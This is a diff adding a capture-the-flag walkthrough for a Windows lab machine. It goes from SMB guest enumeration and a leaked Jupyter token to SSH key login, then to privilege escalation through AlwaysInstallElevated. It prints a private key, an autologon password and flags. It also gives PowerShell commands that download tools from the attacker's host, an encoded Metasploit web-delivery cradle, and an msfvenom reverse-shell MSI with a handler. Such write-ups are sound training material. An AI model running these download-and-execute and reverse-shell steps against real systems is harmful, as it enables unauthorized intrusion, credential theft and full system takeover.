@@ -390,3 +390,395 @@ SMB         10.10.153.67    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest:
 	ADMIN$                                            	NO ACCESS	Remote Admin
 	C$                                                	NO ACCESS	Default share
 	datasci-team                                      	READ, WRITE	
+	.\datasci-team\*
+	dr--r--r--                0 Thu Jul 20 12:38:04 2023	.
+	dr--r--r--                0 Thu Jul 20 12:38:04 2023	..
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.ipynb_checkpoints
+	fr--r--r--              146 Thu Aug 25 11:27:02 2022	Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	misc
+	fr--r--r--           414804 Thu Aug 25 11:27:02 2022	MPE63-3_745-757.pdf
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	papers
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	pics
+	fr--r--r--               12 Thu Aug 25 11:27:02 2022	requirements.txt
+	fr--r--r--             4308 Thu Aug 25 11:27:02 2022	weasel.ipynb
+	fr--r--r--               51 Thu Aug 25 11:27:02 2022	weasel.txt
+	.\datasci-team\.ipynb_checkpoints\*
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
+	fr--r--r--               12 Thu Aug 25 11:27:02 2022	requirements-checkpoint.txt
+	fr--r--r--             5972 Thu Aug 25 11:27:02 2022	weasel-checkpoint.ipynb
+	.\datasci-team\misc\*
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
+	fr--r--r--               52 Thu Aug 25 11:27:02 2022	jupyter-token.txt
+	.\datasci-team\papers\*
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
+	fr--r--r--          3491735 Thu Aug 25 11:27:02 2022	BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf
+	fr--r--r--            45473 Thu Aug 25 11:27:02 2022	Dillard_Living_Like_Weasels.pdf
+	.\datasci-team\pics\*
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	.
+	dr--r--r--                0 Thu Aug 25 11:27:02 2022	..
+	fr--r--r--           301025 Thu Aug 25 11:27:02 2022	57475-weasel-facts.html
+	fr--r--r--           250269 Thu Aug 25 11:27:02 2022	long-tailed-weasel
+	fr--r--r--           229746 Thu Aug 25 11:27:02 2022	Weasel
+	IPC$                                              	READ ONLY	Remote IPC
+	.\IPC$\*
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
+	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-364-0
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-214-0
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-14c-0
+	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	TermSrv_API_service
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	Ctx_WinStation_API_service
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-274-0
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	spoolss
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-7a0-0
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	trkwks
+	fr--r--r--                3 Sun Dec 31 19:03:58 1600	SessEnvPublicRpc
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-3d8-0
+	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-6a0-0
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-26c-0
+	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+
+we find the token to enter jupyter
+
+┌──(witty㉿kali)-[~]
+└─$ smbclient \\\\10.10.153.67\\datasci-team -U "guest"
+Password for [WORKGROUP\guest]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Jul 20 12:38:04 2023
+  ..                                  D        0  Thu Jul 20 12:38:04 2023
+  .ipynb_checkpoints                 DA        0  Thu Aug 25 11:26:47 2022
+  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 11:26:46 2022
+  misc                               DA        0  Thu Aug 25 11:26:47 2022
+  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 11:26:46 2022
+  papers                             DA        0  Thu Aug 25 11:26:47 2022
+  pics                               DA        0  Thu Aug 25 11:26:47 2022
+  requirements.txt                    A       12  Thu Aug 25 11:26:46 2022
+  weasel.ipynb                        A     4308  Thu Aug 25 11:26:46 2022
+  weasel.txt                          A       51  Thu Aug 25 11:26:46 2022
+
+		15587583 blocks of size 4096. 8943538 blocks available
+smb: \> cd misc
+smb: \misc\> ls
+  .                                  DA        0  Thu Aug 25 11:26:47 2022
+  ..                                 DA        0  Thu Aug 25 11:26:47 2022
+  jupyter-token.txt                   A       52  Thu Aug 25 11:26:47 2022
+
+		15587583 blocks of size 4096. 8943538 blocks available
+smb: \misc\> get jupyter-token.txt
+getting file \misc\jupyter-token.txt of size 52 as jupyter-token.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \misc\> exit
+
+┌──(witty㉿kali)-[~]
+└─$ cat jupyter-token.txt                       
+067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
+
+login
+
+Click on the plus sign to add a cell
+Enter any Python into the cell and press `Ctl+Enter` to run the cell
+
+or file > new terminal 
+
+using attackbox
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+This message is shown once a day. To disable it please create the
+/home/dev-datasci/.hushlogin file.
+(base) dev-datasci@DEV-DATASCI-JUP:~$ ls
+anaconda3  anacondainstall.sh  datasci-team  dev-datasci-lowpriv_id_ed25519
+(base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25519
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
+JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
+AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
+qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
+VQAQI=
+-----END OPENSSH PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano dev-datasci_rsa     
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 dev-datasci_rsa 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i dev-datasci_rsa dev-datasci-lowpriv@10.10.193.136
+
+Microsoft Windows [Version 10.0.17763.3287]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>whoami
+dev-datasci-jup\dev-datasci-lowpriv
+dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>powershell       
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\dev-datasci-lowpriv> ls
+
+    Directory: C:\Users\dev-datasci-lowpriv
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        8/25/2022   6:20 AM                .ssh
+d-r---        8/25/2022   5:22 AM                3D Objects
+d-r---        8/25/2022   5:22 AM                Contacts
+d-r---        8/25/2022   7:39 AM                Desktop
+d-r---        8/25/2022   5:22 AM                Documents
+d-r---        8/25/2022   5:22 AM                Downloads
+d-r---        8/25/2022   5:22 AM                Favorites
+d-r---        8/25/2022   5:22 AM                Links
+d-r---        8/25/2022   5:22 AM                Music
+d-r---        8/25/2022   5:22 AM                Saved Games
+d-r---        8/25/2022   5:22 AM                Searches
+d-r---        8/25/2022   5:22 AM                Videos
+
+PS C:\Users\dev-datasci-lowpriv> cd Desktop
+PS C:\Users\dev-datasci-lowpriv\Desktop> ls
+
+    Directory: C:\Users\dev-datasci-lowpriv\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/25/2022   5:21 AM       28916488 python-3.10.6-amd64.exe
+-a----        8/25/2022   7:40 AM             27 user.txt
+
+PS C:\Users\dev-datasci-lowpriv\Desktop> cat user.txt
+THM{w3as3ls_@nd_pyth0ns}
+
+PS C:\Users\dev-datasci-lowpriv\Desktop> iwr http://10.8.19.103/winPEASany_ofs.exe -outfile winpeas.exe
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.193.136 - - [20/Jul/2023 15:47:20] "GET /winPEASany_ofs.exe HTTP/1.1" 200 -
+
++----------¦ Checking AlwaysInstallElevated
++  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalat
+ion#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+PS C:\Users\dev-datasci-lowpriv\Desktop> Invoke-WebRequest -Uri 'http://10.8.19.103/PowerUp.ps1' -Out
+File 'PowerUp.ps1'
+
+PS C:\Users\dev-datasci-lowpriv\Desktop> . .\PowerUp.ps1
+PS C:\Users\dev-datasci-lowpriv\Desktop> ls
+
+    Directory: C:\Users\dev-datasci-lowpriv\Desktop
+
+ 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/20/2023  12:56 PM         494860 PowerUp.ps1
+-a----        8/25/2022   5:21 AM       28916488 python-3.10.6-amd64.exe
+-a----        8/25/2022   7:40 AM             27 user.txt
+-a----        7/20/2023  12:47 PM        1834496 winpeas.exe
+
+PS C:\Users\dev-datasci-lowpriv\Desktop> Invoke-AllChecks
+ 
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+
+[*] Checking for unquoted service paths...
+Get-WmiObject : Access denied  
+At C:\Users\dev-datasci-lowpriv\Desktop\PowerUp.ps1:457 char:21
++     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
++                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectC  
+   ommand
+ 
+
+[*] Checking service executable and argument permissions...
+Get-WMIObject : Access denied  
+At C:\Users\dev-datasci-lowpriv\Desktop\PowerUp.ps1:488 char:5
++     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectC  
+   ommand
+ 
+
+[*] Checking service permissions...
+Get-WmiObject : Access denied  
+At C:\Users\dev-datasci-lowpriv\Desktop\PowerUp.ps1:534 char:17
++     $Services = Get-WmiObject -Class win32_service | Where-Object {$_ ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectC  
+   ommand
+  
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+ 
+HijackablePath : C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Python\Python310\Scripts\       
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Py 
+                 thon\Python310\Scripts\\wlbsctrl.dll' -Command '...'
+
+HijackablePath : C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Python\Python310\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\dev-datasci-lowpriv\AppData\Local\Programs\Py 
+                 thon\Python310\\wlbsctrl.dll' -Command '...'
+
+HijackablePath : C:\Users\dev-datasci-lowpriv\AppData\Local\Microsoft\WindowsApps\
+AbuseFunction  : Write-HijackDll -OutputFile
+                 'C:\Users\dev-datasci-lowpriv\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'    
+                 -Command '...'
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+OutputFile    :  
+AbuseFunction : Write-UserAddMSI
+
+ 
+
+ 
+
+[*] Checking for Autologon credentials in registry...
+
+DefaultDomainName    : DEV-DATASCI-JUP
+DefaultUserName      : dev-datasci-lowpriv
+DefaultPassword      : wUqnKWqzha*W!PWrPRWi!M8faUn
+AltDefaultDomainName :
+AltDefaultUserName   :
+AltDefaultPassword   :
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ msfconsole
+```
+```text
+- # cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Set the current module's RHOSTS with 
+database values using hosts -R or services 
+-R
+Metasploit Documentation: https://docs.metasploit.com/
+```
+```text
+- msf6 > use exploit/multi/script/web_delivery
+[*] Using configured payload python/meterpreter/reverse_tcp
+```
+```text
+- msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+```
+```text
+- msf6 exploit(multi/script/web_delivery) > set LHOST 10.8.19.103
+LHOST => 10.8.19.103
+```
+```text
+- msf6 exploit(multi/script/web_delivery) > set LPORT 4444
+LPORT => 4444
+```
+```text
+- msf6 exploit(multi/script/web_delivery) > set target PSH
+target => PSH
+```
+```text
+- msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] Using URL: http://10.8.19.103:8080/aTTrkWg3qi0tB
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABxAEoAXwBDAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHEASgBfAEMALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABxAEoAXwBDAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADEAOQAuADEAMAAzADoAOAAwADgAMAAvAGEAVABUAHIAawBXAGcAMwBxAGkAMAB0AEIALwBxAHQAVgBBAEQAWgBaAHQAdwBVAEgAaAA0AE8AJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADgALgAxADkALgAxADAAMwA6ADgAMAA4ADAALwBhAFQAVAByAGsAVwBnADMAcQBpADAAdABCACcAKQApADsA
+
+nope
+
+- **AlwaysInstallElevated** is a windows feature that allows standard user account with no administrative privileges software packaged in the Microsoft Windows Installer (MSI) format with admin privs.
+- We can leverage this configuration to elevate our privileges by generating a custom executable with the MSI format.
+- we can utilize the msiexec utility to execute the MSI executable, which will give us an elevated session.
+- The Always Install Elevated feature is configured in the Windows Registry.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.19.103 LPORT=4444 -f msi > setup.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ msfconsole
+```
+```text
+- # cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Metasploit can be configured at startup, see 
+msfconsole --help to learn more
+Metasploit Documentation: https://docs.metasploit.com/
+```
+```text
+- msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+```
+```text
+- msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+```
+```text
+- msf6 exploit(multi/handler) > set lhost 10.8.19.103
+lhost => 10.8.19.103
+```
+```text
+- msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+```
+- ***THM{w3as3ls_@nd_pyth0ns}***
+- ***THM{evelated_w3as3l_l0ngest_boi}***
+
+## Notes / Lessons Learned
+[[Different CTF]]
+
